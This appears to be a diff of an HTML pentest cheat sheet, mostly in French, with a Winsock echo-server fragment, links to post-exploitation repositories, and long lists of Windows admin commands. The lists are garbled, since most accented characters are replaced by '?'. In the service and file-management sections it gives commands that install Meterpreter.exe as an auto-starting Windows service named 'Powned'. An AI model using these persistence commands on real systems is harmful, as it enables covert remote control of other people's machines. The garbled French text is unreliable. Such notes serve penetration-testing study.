+        printf(<span class="st">&quot;accept failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ListenSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// No longer need server socket</span>
+    closesocket(ListenSocket);
+
+    <span class="co">// Receive until the peer shuts down the connection</span>
+    <span class="kw">do</span> {
+
+        iResult = recv(ClientSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
+        <span class="kw">if</span> (iResult &gt; <span class="dv">0</span>) {
+            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
+
+        <span class="co">// Echo the buffer back to the sender</span>
+            iSendResult = send( ClientSocket, recvbuf, iResult, <span class="dv">0</span> );
+            <span class="kw">if</span> (iSendResult == SOCKET_ERROR) {
+                printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+                closesocket(ClientSocket);
+                WSACleanup();
+                <span class="kw">return</span> <span class="dv">1</span>;
+            }
+            printf(<span class="st">&quot;Bytes sent: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iSendResult);
+        }
+        <span class="kw">else</span> <span class="kw">if</span> (iResult == <span class="dv">0</span>)
+            printf(<span class="st">&quot;Connection closing...</span><span class="ch">\n</span><span class="st">&quot;</span>);
+        <span class="kw">else</span>  {
+            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+            closesocket(ClientSocket);
+            WSACleanup();
+            <span class="kw">return</span> <span class="dv">1</span>;
+        }
+
+    } <span class="kw">while</span> (iResult &gt; <span class="dv">0</span>);
+
+    <span class="co">// shutdown the connection since we&#39;re done</span>
+    iResult = shutdown(ClientSocket, SD_SEND);
+    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
+        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
+        closesocket(ClientSocket);
+        WSACleanup();
+        <span class="kw">return</span> <span class="dv">1</span>;
+    }
+
+    <span class="co">// cleanup</span>
+    closesocket(ClientSocket);
+    WSACleanup();
+
+    <span class="kw">return</span> <span class="dv">0</span>;
+}</code></pre>
+<h1 id="github"><a href="#github">GitHub</a></h1>
+<h2 id="github-repositories"><a href="#github-repositories">GitHub repositories</a></h2>
+<h3 id="useful-powershell-scripts"><a href="#useful-powershell-scripts">Useful PowerShell scripts</a></h3>
+<pre><code>https://github.com/mubix/PowerShell</code></pre>
+<h3 id="post-exploitation-collection"><a href="#post-exploitation-collection">Post Exploitation Collection</a></h3>
+<pre><code>https://github.com/mubix/post-exploitation</code></pre>
+<h3 id="white-chapel-password-auditing-framework"><a href="#white-chapel-password-auditing-framework">White Chapel Password Auditing Framework</a></h3>
+<pre><code>https://github.com/mubix/WhiteChapel</code></pre>
+<h3 id="collection-of-multiple-types-of-lists"><a href="#collection-of-multiple-types-of-lists">Collection of multiple types of lists</a></h3>
+<pre><code>https://github.com/mubix/SecLists</code></pre>
+<h1 id="os"><a href="#os">OS</a></h1>
+<h2 id="linux"><a href="#linux">Linux</a></h2>
+<h3 id="liste-de-paquets-utiles-debian"><a href="#liste-de-paquets-utiles-debian">Liste de paquets utiles (debian)</a></h3>
+<pre><code>xorg awesome awesome-extra
+open-vm-tools open-vm-toolbox
+
+ntfs-3g cifs-utils
+
+apache2 mysql-server php5 php5-mysql php5-cli php-mail
+
+build-essential
+gdb
+linux-headers-$(uname -r)
+
+imagemagick
+emacs
+pandoc
+moreutils
+nmap
+python-scapy
+tcpdump
+
+iceweasel
+easytag
+gparted
+vlc
+wireshark</code></pre>
+<h2 id="post-exploitation-command-list"><a href="#post-exploitation-command-list">Post-Exploitation Command List</a></h2>
+<h3 id="github-repository-full-of-post-exploit-stuff"><a href="#github-repository-full-of-post-exploit-stuff">GitHub repository full of post exploit stuff</a></h3>
+<pre><code>https://github.com/mubix/post-exploitation-wiki</code></pre>
+<h3 id="linux-unix-bsd"><a href="#linux-unix-bsd">Linux Unix BSD</a></h3>
+<p><a href="../ressources/Post-ExploitationCommandList/LinuxUnixBSD/LinuxUnixBSDPostExploitationCommandList.html">Local Link</a></p>
+<p><a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html">Basic Linux Privilege Escalation</a></p>
+<h3 id="metasploit"><a href="#metasploit">Metasploit</a></h3>
+<p><a href="../ressources/Post-ExploitationCommandList/Metasploit/MetasploitPostExploitationCommandList.html">Local Link</a></p>
+<h3 id="obscuresystemsaixembedded"><a href="#obscuresystemsaixembedded">ObscureSystemsAIXEmbedded</a></h3>
+<p><a href="../ressources/Post-ExploitationCommandList/ObscureSystemsAIXEmbedded/ObscureSystems_AIXEmbededetc_PostExploitComma.html">Local Link</a></p>
+<h3 id="osx"><a href="#osx">OSX</a></h3>
+<p><a href="../ressources/Post-ExploitationCommandList/OSX/OSXPostExploitation.html">Local Link</a></p>
+<h3 id="windows-1"><a href="#windows-1">Windows</a></h3>
+<p><a href="../ressources/Post-ExploitationCommandList/Windows/WindowsPostExploitationCommandList.html">Local Link</a></p>
+<h2 id="windows-2"><a href="#windows-2">Windows</a></h2>
+<h3 id="commandes-windows"><a href="#commandes-windows">Commandes Windows</a></h3>
+<h4 id="propris"><a href="#propris">Propri?s</a></h4>
 <ul>
-<li>ACCESS.CPL : ouvre les options d’accessibilité (Pour XP uniquement)</li>
+<li>ACCESS.CPL : ouvre les options d’accessibilit?Pour XP uniquement)</li>
 <li>APPWIZ.CPL : ouvre l’outil Ajouter/Supprimer un programme</li>
 <li>AZMAN.MSC : ouvre le gestionnaire d’autorisations (Pour Vista uniquement)</li>
-<li>CERTMGR.MSC : ouvre les certificats pour l’utilisateur actuel</li>
+<li>CERTMGR.MSC : ouvre les certificats pour l?tilisateur actuel</li>
 <li>CLICONFG : ouvre la configuration des clients SQL</li>
-<li>COLLAB.CPL : ouvre le voisinage immédiat (Pour Vista uniquement)</li>
+<li>COLLAB.CPL : ouvre le voisinage imm?at (Pour Vista uniquement)</li>
 <li>COMEXP.MSC ou bien DCOMCNFG : ouvre l’outil services et composants (Pour Vista uniquement)</li>
 <li>COMPMGMT.MSC : ouvre l’outil de gestion de l’ordinateur</li>
-<li>COMPUTERDEFAULTS : ouvrir l’outil des programmes par défaut (Pour Vista uniquement)</li>
+<li>COMPUTERDEFAULTS : ouvrir l?util des programmes par d?ut (Pour Vista uniquement)</li>
 <li>CONTROL /NAME MICROSOFT.BACKUPANDRESTORECENTER : ouvre le centre de sauvegarde et de restauration (Pour Vista uniquement). Tutoriel ICI</li>
 <li>CONTROL ADMINTOOLS : ouvre les outils d’administrations</li>
-<li>CONTROL COLOR : ouvre les paramètres de l’apparence</li>
+<li>CONTROL COLOR : ouvre les param?es de l’apparence</li>
 <li>CONTROL FOLDERS : ouvre les options de dossiers</li>
 <li>CONTROL FONTS : ouvre le gestionnaire de polices</li>
-<li>CONTROL INTERNATIONAL ou bien INTL.CPL : ouvre les options régionales et linguistiques</li>
-<li>CONTROL KEYBOARD : ouvre les propriétés du clavier</li>
-<li>CONTROL MOUSE ou bien MAIN.CPL : ouvre les propriétés de la souris</li>
+<li>CONTROL INTERNATIONAL ou bien INTL.CPL : ouvre les options r?onales et linguistiques</li>
+<li>CONTROL KEYBOARD : ouvre les propri?s du clavier</li>
+<li>CONTROL MOUSE ou bien MAIN.CPL : ouvre les propri?s de la souris</li>
 <li>CONTROL PRINTERS : ouvre les imprimantes et les fax disponibles</li>
-<li>CONTROL USERPASSWORDS : ouvre l’éditeur des comptes utilisateurs</li>
-<li>CONTROL USERPASSWORDS2 ou bien NETPLWIZ : contrôle les utilisateurs et leurs accès</li>
+<li>CONTROL USERPASSWORDS : ouvre l?diteur des comptes utilisateurs</li>
+<li>CONTROL USERPASSWORDS2 ou bien NETPLWIZ : contr??les utilisateurs et leurs acc?</li>
 <li>CONTROL : ouvre le panneau de configuration</li>
-<li>CREDWIZ : ouvre l’outil de sauvegarde et restauration des mots de passe des utilisateurs (Pour Vista uniquement)</li>
-<li>DESK.CPL : ouvre les paramètres d’affichage</li>
-<li>DEVMGMT.MSC : ouvre les gestionnaire de périphériques. Tutoriel ICI</li>
+<li>CREDWIZ : ouvre l?util de sauvegarde et restauration des mots de passe des utilisateurs (Pour Vista uniquement)</li>
+<li>DESK.CPL : ouvre les param?es d’affichage</li>
+<li>DEVMGMT.MSC : ouvre les gestionnaire de p?ph?ques. Tutoriel ICI</li>
 <li>DRWTSN32 : ouvre Dr. Watson (Pour XP uniquement)</li>
 <li>DXDIAG : ouvre l’outil de diagnostic DirectX</li>
-<li>EVENTVWR ou bien EVENTVWR.MSC : ouvre l’observateur d’évènements</li>
-<li>FSMGMT.MSC : ouvre les dossiers partagés</li>
-<li>GPEDIT.MSC : ouvre l’éditeur des stratégies de groupe (Pour les éditions professionnelles et plus de Windows)</li>
-<li>HDWWIZ.CPL : ouvre l’assistant ajout de matériels</li>
-<li>INFOCARDCPL.CPL : ouvre l’assistant compatibilité des programmes</li>
+<li>EVENTVWR ou bien EVENTVWR.MSC : ouvre l’observateur d’?nements</li>
+<li>FSMGMT.MSC : ouvre les dossiers partag?</li>
+<li>GPEDIT.MSC : ouvre l?diteur des strat?es de groupe (Pour les ?tions professionnelles et plus de Windows)</li>
+<li>HDWWIZ.CPL : ouvre l’assistant ajout de mat?els</li>
+<li>INFOCARDCPL.CPL : ouvre l’assistant compatibilit?es programmes</li>
 <li>IRPROPS.CPL : ouvre le gestionnaire d’infrarouge</li>
 <li>ISCSICPL : ouvre l’outil de configuration de l’initiateur ISCI Microsoft (Pour Vista uniquement)</li>
-<li>JOY.CPL : ouvre l’outil de contrôleur de jeu</li>
-<li>LPKSETUP : ouvre l’assistant d’installation et désinstallation des langues d’affichage (Pour Vista uniquement)</li>
-<li>LUSRMGR.MSC : ouvre l’éditeur des utilisateurs et groupes locaux</li>
-<li>MDSCHED : ouvre l’outil de diagnostics de la mémoire Windows (Pour Vista uniquement)</li>
+<li>JOY.CPL : ouvre l’outil de contr??r de jeu</li>
+<li>LPKSETUP : ouvre l?ssistant d?nstallation et d?nstallation des langues d?ffichage (Pour Vista uniquement)</li>
+<li>LUSRMGR.MSC : ouvre l?diteur des utilisateurs et groupes locaux</li>
+<li>MDSCHED : ouvre l’outil de diagnostics de la m?ire Windows (Pour Vista uniquement)</li>
 <li>MMC : ouvre une nouvelle console vide</li>
-<li>MMSYS.CPL : ouvre les paramètres de sons</li>
+<li>MMSYS.CPL : ouvre les param?es de sons</li>
 <li>MOBSYNC : ouvre le centre de synchronisation</li>
-<li>MSCONFIG : ouvre l’outil de configuration du système</li>
+<li>MSCONFIG : ouvre l’outil de configuration du syst?</li>
 <li>NAPCLCFG.MSC : ouvre l’outil de configuration du client NAP (Pour Vista uniquement)</li>
 <li>NTMSMGR.MSC : ouvre le gestionnaire des supports de stockage amovibles</li>
-<li>NTMSOPRQ.MSC : ouvre les demandes de l’opérateur de stockage amovible</li>
-<li>ODBCAD32 : ouvre l’administrateur de sources de données ODBC</li>
-<li>OPTIONALFEATURES : ouvre l’outil Ajouter/Supprimer des composants Windows (Pour Vista uniquement)</li>
-<li>PERFMON ou bien PERFMON.MSC : ouvre le moniteur de fiabilité et de performances Windows.</li>
-<li>POWERCFG.CPL : ouvre le gestionnaire des modes d’alimentation (Pour Vista uniquement)</li>
-<li>REGEDIT ou bien REGEDT32 (Pour Vista uniquement) : ouvre l’éditeur de registre</li>
+<li>NTMSOPRQ.MSC : ouvre les demandes de l’op?teur de stockage amovible</li>
+<li>ODBCAD32 : ouvre l’administrateur de sources de donn? ODBC</li>
+<li>OPTIONALFEATURES : ouvre l?util Ajouter/Supprimer des composants Windows (Pour Vista uniquement)</li>
+<li>PERFMON ou bien PERFMON.MSC : ouvre le moniteur de fiabilit?t de performances Windows.</li>
+<li>POWERCFG.CPL : ouvre le gestionnaire des modes d?limentation (Pour Vista uniquement)</li>
+<li>REGEDIT ou bien REGEDT32 (Pour Vista uniquement) : ouvre l’?teur de registre</li>
 <li>REKEYWIZ : ouvre le gestionnaire des certificats de chiffrement de fichiers (Pour Vista uniquement)</li>
-<li>RSOP.MSC : ouvre le jeu de stratégie résultant</li>
-<li>SECPOL.MSC : ouvre les paramètres de sécurités locales</li>
+<li>RSOP.MSC : ouvre le jeu de strat?e r?ltant</li>
+<li>SECPOL.MSC : ouvre les param?es de s?rit?locales</li>
 <li>SERVICES.MSC : ouvre le gestionnaire de services</li>
-<li>SLUI : ouvre l’assistant d’activation de Windows (Pour Vista uniquement)</li>
-<li>SYSDM.CPL : ouvre les propriétés système</li>
-<li>SYSEDIT : ouvre l’éditeur de configuration système (Attention, à manipuler avec prudence)</li>
-<li>SYSKEY : ouvre l’utilitaire de protection de la base de données des comptes Windows (Attention, à manipuler avec extrême prudence !)</li>
-<li>SYSPREP: ouvre le dossier contenant l’outil de préparation du système (Pour Vista uniquement)</li>
-<li>TABLETPC.CPL : ouvre les paramètres pour Tablet pc (Pour Vista uniquement)</li>
-<li>TASKSCHD.MSC ou bien CONTROL SCHEDTASKS : ouvre le planificateur de tâches (Pour Vista uniquement)</li>
-<li>TELEPHON.CPL : ouvre l’outil de connexion téléphonique</li>
-<li>TIMEDATE.CPL : ouvre les paramètres de l’heure et de la date</li>
-<li>TPM.MSC : ouvre l’outil gestion de module de plateforme sécurisée sur l’ordinateur local (Pour Vista uniquement)</li>
-<li>UTILMAN : ouvre les options d’ergonomie (Pour Vista uniquement)</li>
-<li>VERIFIER : ouvre le gestionnaire de vérification des pilotes</li>
+<li>SLUI : ouvre l?ssistant d?ctivation de Windows (Pour Vista uniquement)</li>
+<li>SYSDM.CPL : ouvre les propri?s syst?</li>
+<li>SYSEDIT : ouvre l?diteur de configuration syst? (Attention, ?anipuler avec prudence)</li>
+<li>SYSKEY : ouvre l?tilitaire de protection de la base de donn? des comptes Windows (Attention, ?anipuler avec extr? prudence !)</li>
+<li>SYSPREP: ouvre le dossier contenant l’outil de pr?ration du syst? (Pour Vista uniquement)</li>
+<li>TABLETPC.CPL : ouvre les param?es pour Tablet pc (Pour Vista uniquement)</li>
+<li>TASKSCHD.MSC ou bien CONTROL SCHEDTASKS : ouvre le planificateur de t?es (Pour Vista uniquement)</li>
+<li>TELEPHON.CPL : ouvre l’outil de connexion t?phonique</li>
+<li>TIMEDATE.CPL : ouvre les param?es de l’heure et de la date</li>
+<li>TPM.MSC : ouvre l’outil gestion de module de plateforme s?ris?sur l’ordinateur local (Pour Vista uniquement)</li>
+<li>UTILMAN : ouvre les options d?rgonomie (Pour Vista uniquement)</li>
+<li>VERIFIER : ouvre le gestionnaire de v?fication des pilotes</li>
 <li>WMIMGMT.MSC : ouvre Windows Management Infrastructure</li>
-<li>WSCUI.CPL : ouvre le centre de sécurité Windows</li>
-<li>WUAUCPL.CPL : ouvre le service de mise à jour Windows (Pour XP uniquement)</li>
+<li>WSCUI.CPL : ouvre le centre de s?rit?indows</li>
+<li>WUAUCPL.CPL : ouvre le service de mise ?our Windows (Pour XP uniquement)</li>
 </ul>
-<h2 id="programmes-et-outils-windows"><a href="#TOC">Programmes et outils Windows</a></h2>
+<h4 id="programmes-et-outils-windows"><a href="#programmes-et-outils-windows">Programmes et outils Windows</a></h4>
 <ul>
-<li>WINDIR%32.EXE : ouvre l’outil de restauration de système (Pour XP uniquement). Tutoriel ICI</li>
+<li>WINDIR%32.EXE : ouvre l?util de restauration de syst? (Pour XP uniquement). Tutoriel ICI</li>
 <li>CALC : ouvre la calculatrice</li>
-<li>CHARMAP : ouvre la table des caractères</li>
-<li>CLIPBRD : ouvre le presse papier (Pour XP uniquement, pour l’ajouter à Vista voir ICI)</li>
+<li>CHARMAP : ouvre la table des caract?s</li>
+<li>CLIPBRD : ouvre le presse papier (Pour XP uniquement, pour l’ajouter ?ista voir ICI)</li>
 <li>CMD : ouvre l’invite de commandes</li>
-<li>DIALER : ouvre le numérateur téléphonique de Windows</li>
+<li>DIALER : ouvre le num?teur t?phonique de Windows</li>
 <li>DVDPLAY : ouvre votre lecteur DVD</li>
-<li>EUDCEDIT : ouvre l’éditeur de caractères privés</li>
+<li>EUDCEDIT : ouvre l?diteur de caract?s priv?</li>
 <li>EXPLORER : ouvre l’explorateur Windows</li>
 <li>FSQUIRT : Assistant transfert Bluetooth</li>
 <li>IEXPLORE : ouvre Internet Explorer</li>
-<li>IEXPRESS : ouvre l’assistant de création des archives auto-extractibles. Tutoriel ICI</li>
+<li>IEXPRESS : ouvre l?ssistant de cr?ion des archives auto-extractibles. Tutoriel ICI</li>
 <li>JOURNAL : ouvre un nouveau journal (Pour Vista uniquement)</li>
 <li>MAGNIFY : ouvre la loupe</li>
-<li>MBLCTR : ouvre le centre de mobilité de Windows (Pour Vista uniquement)</li>
-<li>MIGWIZ : ouvre l’outil de transfert de fichiers et de paramètres Windows (Pour Vista uniquement)</li>
-<li>MIGWIZ.EXE : ouvre l’outil de transfert de fichiers et de paramètres Windows (pour XP uniquement)</li>
+<li>MBLCTR : ouvre le centre de mobilit?e Windows (Pour Vista uniquement)</li>
+<li>MIGWIZ : ouvre l’outil de transfert de fichiers et de param?es Windows (Pour Vista uniquement)</li>
+<li>MIGWIZ.EXE : ouvre l’outil de transfert de fichiers et de param?es Windows (pour XP uniquement)</li>
 <li>MOVIEMK : ouvre Windows Movie Maker</li>
-<li>MRT : lance l’utilitaire de suppression de logiciel malveillant. Tutoriel ICI</li>
-<li>MSDT : ouvre l’outil de diagnostics et support Microsoft</li>
-<li>MSINFO32 : ouvre les informations système</li>
+<li>MRT : lance l?tilitaire de suppression de logiciel malveillant. Tutoriel ICI</li>
+<li>MSDT : ouvre l?util de diagnostics et support Microsoft</li>
+<li>MSINFO32 : ouvre les informations syst?</li>
 <li>MSPAINT : ouvre Paint</li>
-<li>MSRA : ouvre l’assistance à distance Windows</li>
+<li>MSRA : ouvre l’assistance ?istance Windows</li>
 <li>MSTSC : ouvre l’outil de connexion du bureau a distance</li>
 <li>NOTEPAD : ouvre le bloc-notes</li>
 <li>OSK : ouvre le clavier visuel. Tutoriel ICI</li>
 <li>PRINTBRMUI : ouvre l’assistant de migration d’imprimante (Vista uniquement)</li>
-<li>RSTRUI : ouvre l’outil de restauration du système (Pour Vista uniquement)</li>
+<li>RSTRUI : ouvre l’outil de restauration du syst? (Pour Vista uniquement)</li>
 <li>SIDEBAR : ouvre le volet Windows (Pour Vista uniquement)</li>
-<li>SIGVERIF : ouvre l’outil de vérification des signatures de fichiers</li>
-<li>SNDVOL : ouvre le mélangeur de volume</li>
-<li>SNIPPINGTOOL : ouvre l’outil capture d’écran (Pour Vista uniquement). Tutoriel ICI</li>
-<li>SOUNDRECORDER : ouvre le magnétophone</li>
-<li>STIKYNOT : ouvre le pense-bête (Pour Vista uniquement)</li>
+<li>SIGVERIF : ouvre l’outil de v?fication des signatures de fichiers</li>
+<li>SNDVOL : ouvre le m?ngeur de volume</li>
+<li>SNIPPINGTOOL : ouvre l’outil capture d’?an (Pour Vista uniquement). Tutoriel ICI</li>
+<li>SOUNDRECORDER : ouvre le magn?phone</li>
+<li>STIKYNOT : ouvre le pense-b? (Pour Vista uniquement)</li>
 <li>TABTIP : ouvre le panneau de saisie Tablet PC (Pour Vista uniquement)</li>
-<li>TASKMGR : ouvre le gestionnaire des tâches Windows</li>
+<li>TASKMGR : ouvre le gestionnaire des t?es Windows</li>
 <li>WAB : ouvre les contacts (Pour Vista uniquement)</li>
-<li>WERCON : ouvre l’outil de rapports et de solutions aux problèmes (Pour Vista uniquement)</li>
+<li>WERCON : ouvre l’outil de rapports et de solutions aux probl?s (Pour Vista uniquement)</li>
 <li>WINCAL : ouvre le calendrier Windows (Pour Vista uniquement)</li>
-<li>WINCHAT : ouvre le logiciel Microsoft de chat en réseau (Pour Windows XP uniquement)</li>
-<li>WINDOWSANYTIMEUPGRADE : permet la mise à niveau de Windows Vista</li>
-<li>WINVER : ouvre la fenêtre pour connaître votre version Windows</li>
-<li>WINWORD: ouvre Word (si il est installé)</li>
+<li>WINCHAT : ouvre le logiciel Microsoft de chat en r?au (Pour Windows XP uniquement)</li>
+<li>WINDOWSANYTIMEUPGRADE : permet la mise ?iveau de Windows Vista</li>
+<li>WINVER : ouvre la fen?e pour conna?e votre version Windows</li>
+<li>WINWORD: ouvre Word (si il est install?</li>
 <li>WMPLAYER : ouvre le lecteur Windows Media</li>
 <li>WRITE ou bien Wordpad : ouvre Wordpad</li>
 </ul>
-<h2 id="gestion-des-disques"><a href="#TOC">Gestion des disques</a></h2>
+<h4 id="gestion-des-disques"><a href="#gestion-des-disques">Gestion des disques</a></h4>
 <ul>
-<li>CHKDSK : effectue une analyse de la partition précisée dans les paramètres de la commande (Pour plus d’informations, tapez CHKDSK /? dans l’invite de commande CMD)</li>
+<li>CHKDSK : effectue une analyse de la partition pr?s?dans les param?es de la commande (Pour plus d?nformations, tapez CHKDSK /? dans l?nvite de commande CMD)</li>
 <li>CLEANMGR : ouvre l’outil de nettoyage de disque</li>
-<li>DEFRAG: Défragmente le disque dur (pour savoir comment utiliser, c’est ici )</li>
-<li>DFRG.MSC : ouvre l’outil de défragmentation de disque</li>
+<li>DEFRAG: D?agmente le disque dur (pour savoir comment utiliser, c’est ici )</li>
+<li>DFRG.MSC : ouvre l?util de d?agmentation de disque</li>
 <li>DISKMGMT.MSC : ouvre le gestionnaire de disques</li>
-<li>DISKPART : ouvre l’outil de partitionnement (un peu lourd à manipuler)</li>
+<li>DISKPART : ouvre l?util de partitionnement (un peu lourd ?anipuler)</li>
 </ul>
-<h2 id="gestion-des-réseaux-et-internet"><a href="#TOC">Gestion des réseaux et Internet</a></h2>
+<h4 id="gestion-des-raux-et-internet"><a href="#gestion-des-raux-et-internet">Gestion des r?aux et Internet</a></h4>
 <ul>
-<li>CONTROL NETCONNECTIONS ou bien NCPA.CPL : ouvre les connexions réseau</li>
+<li>CONTROL NETCONNECTIONS ou bien NCPA.CPL : ouvre les connexions r?au</li>
 <li>FIREWALL.CPL : ouvre le pare-feu Windows</li>
-<li>INETCPL.CPL : ouvre les propriétés internet</li>
-<li>IPCONFIG : affiche les configurations des adresses IP sur l’ordinateur (Pour plus d’informations, tapez IPCONFIG /? dans l’invite de commande CMD)</li>
-<li>NETSETUP.CPL : ouvre l’assistant configuration réseau (Pour XP uniquement)</li>
-<li>WF.MSC : ouvre les fonctions avancées du pare-feu Windows (Pour Vista uniquement). Tutoriel ICI</li>
-<li>À VOIR ÉGALEMENT : Commandes IP relatives aux réseaux sous Windows</li>
+<li>INETCPL.CPL : ouvre les propri?s internet</li>
+<li>IPCONFIG : affiche les configurations des adresses IP sur l?rdinateur (Pour plus d?nformations, tapez IPCONFIG /? dans l?nvite de commande CMD)</li>
+<li>NETSETUP.CPL : ouvre l?ssistant configuration r?au (Pour XP uniquement)</li>
+<li>WF.MSC : ouvre les fonctions avanc? du pare-feu Windows (Pour Vista uniquement). Tutoriel ICI</li>
+<li>VOIR ?ALEMENT : Commandes IP relatives aux r?aux sous Windows</li>
 </ul>
-<h2 id="autres-commandes"><a href="#TOC">Autres commandes</a></h2>
+<h4 id="autres-commandes"><a href="#autres-commandes">Autres commandes</a></h4>
 <ul>
-<li>%HOMEDRIVE% : ouvre l’explorateur sur la partition ou le système d’exploitation est installé</li>
-<li>%HOMEPATH% : ouvre le dossier d’utilisateur connecté actuellement C:and settings[nom d’utilisateur]</li>
-<li>%PROGRAMFILES% : ouvre le dossier d’installation d’autres programmes (Program Files)</li>
+<li>%HOMEDRIVE% : ouvre l’explorateur sur la partition ou le syst? d’exploitation est install?* %HOMEPATH% : ouvre le dossier d’utilisateur connect?ctuellement C:and settings[nom d’utilisateur]</li>
+<li>%PROGRAMFILES% : ouvre le dossier d?nstallation d?utres programmes (Program Files)</li>
 <li>%TEMP% ou bien %TMP% : ouvre le dossier temporaire</li>
-<li>%USERPROFILE% : ouvre le dossier du profil de l’utilisateur connecté actuellement</li>
-<li>%WINDIR% ou bien %SYSTEMROOT% : ouvre le dossier d’installation de Windows</li>
-<li>%WINDIR%3232.exe shell32.dll,Control_RunDLL hotplug.dll : affiche la fenêtre “Supprimer le périphérique en toute sécurité”</li>
-<li>AC3FILTER.CPL : ouvre les propriétés du filtre AC3 (Si installé)</li>
-<li>FIREFOX : lance Mozilla FireFox (Si installé)</li>
-<li>JAVAWS : Visualise le cache du logiciel JAVA (Si installé)</li>
+<li>%USERPROFILE% : ouvre le dossier du profil de l’utilisateur connect?ctuellement</li>
+<li>%WINDIR% ou bien %SYSTEMROOT% : ouvre le dossier d?nstallation de Windows</li>
+<li>%WINDIR%3232.exe shell32.dll,Control_RunDLL hotplug.dll : affiche la fen?e “Supprimer le p?ph?que en toute s?rit?</li>
+<li>AC3FILTER.CPL : ouvre les propri?s du filtre AC3 (Si install?</li>
+<li>FIREFOX : lance Mozilla FireFox (Si install?</li>
+<li>JAVAWS : Visualise le cache du logiciel JAVA (Si install?</li>
 <li>LOGOFF : ferme la session actuelle</li>
-<li>NETPROJ : autorise ou pas la connexion à un projecteur réseau (Pour Vista uniquement)</li>
-<li>Vérificateur des fichiers système (Nécessite un CD de Windows si le cache n’est pas disponible): (Tutoriel ICI)</li>
-<li>SFC /SCANNOW : scanne immédiatement tous les fichiers système et répare les fichiers endommagés</li>
-<li>SFC /VERIFYONLY : scanne seulement les fichiers système</li>
-<li>SFC /SCANFILE=“nom et chemin de fichier” : scanne le fichier précisé, et le répare s’il est endommagé</li>
-<li>SFC /VERIFYFILE=“nom et chemin de fichier” : scanne seulement le fichier précisé</li>
-<li>SFC /SCANONCE : scanne les fichiers système au prochain redémarrage</li>
-<li>SFC /REVERT : remet la configuration initiale (Pour plus d’informations, tapez SFC /? dans l’invite de commande CMD.</li>
-<li>SHUTDOWN : éteint Windows</li>
-<li>SHUTDOWN –A : interrompe l’arrêt de Windows</li>
+<li>NETPROJ : autorise ou pas la connexion ?n projecteur r?au (Pour Vista uniquement)</li>
+<li>V?ficateur des fichiers syst? (N?ssite un CD de Windows si le cache n?st pas disponible): (Tutoriel ICI)</li>
+<li>SFC /SCANNOW : scanne imm?atement tous les fichiers syst? et r?re les fichiers endommag?</li>
+<li>SFC /VERIFYONLY : scanne seulement les fichiers syst?</li>
+<li>SFC /SCANFILE=“nom et chemin de fichier” : scanne le fichier pr?s?et le r?re s?l est endommag?* SFC /VERIFYFILE=“nom et chemin de fichier” : scanne seulement le fichier pr?s?* SFC /SCANONCE : scanne les fichiers syst? au prochain red?rrage</li>
+<li>SFC /REVERT : remet la configuration initiale (Pour plus d?nformations, tapez SFC /? dans l?nvite de commande CMD.</li>
+<li>SHUTDOWN : ?int Windows</li>
+<li>SHUTDOWN ? : interrompe l?rr?de Windows</li>
 <li>VSP1CLN : supprime le cache d’installation du service pack 1 de Vista (Tutoriel ICI)</li>
 </ul>
-<h2 id="gestion-des-utilisateurs"><a href="#TOC">Gestion des utilisateurs</a></h2>
-<h3 id="activation-dun-utilisateur"><a href="#TOC">activation d’un utilisateur</a></h3>
+<h4 id="gestion-des-utilisateurs"><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a></h4>
+<p>activation d’un utilisateur</p>
 <pre><code>net users sysadmin /active:yes</code></pre>
-<h3 id="désactivation-dun-utilisateur"><a href="#TOC">désactivation d’un utilisateur</a></h3>
+<p>d?ctivation d’un utilisateur</p>
 <pre><code>net users sysadmin /active:no</code></pre>
-<h2 id="gestion-des-services"><a href="#TOC">Gestion des services</a></h2>
+<h4 id="gestion-des-services"><a href="#gestion-des-services">Gestion des services</a></h4>
 <pre><code>sc create Powned binPath# &quot;C:\Meterpreter.exe&quot;
 sc config Powned start# auto
 net start Powned
 sc delete Powned</code></pre>
-<h2 id="gestion-des-fichiers"><a href="#TOC">Gestion des fichiers</a></h2>
+<h4 id="gestion-des-fichiers"><a href="#gestion-des-fichiers">Gestion des fichiers</a></h4>
 <pre><code>xcopy Meterpreter.exe c:\</code></pre>
-<h1 id="windows-pentest-commands"><a href="#TOC">Windows pentest commands</a></h1>
-<h2 id="blind-files"><a href="#TOC">Blind Files</a></h2>
-<table style="border-collapse: collapse; border: medium none;">
-<colgroup><col width="251"></col><col width="421"></col></colgroup>
-<tbody>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">File</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"></span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: bold; text-decoration: none; vertical-align: baseline;">Expected Contents / Description</span><span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;"></span>
-</td></tr>
-<tr style="height: 0px;"><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">%SYSTEMDRIVE%.ini</span>
-</td><td style="border: 1px dotted rgb(170, 170, 170); padding: 7px; vertical-align: top;">
-<span style="background-color: transparent; color: black; font-size: small; font-style: normal; font-variant: normal; font-weight: normal; text-decoration: none; vertical-align: baseline;">A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening.</span>
-</td></tr>
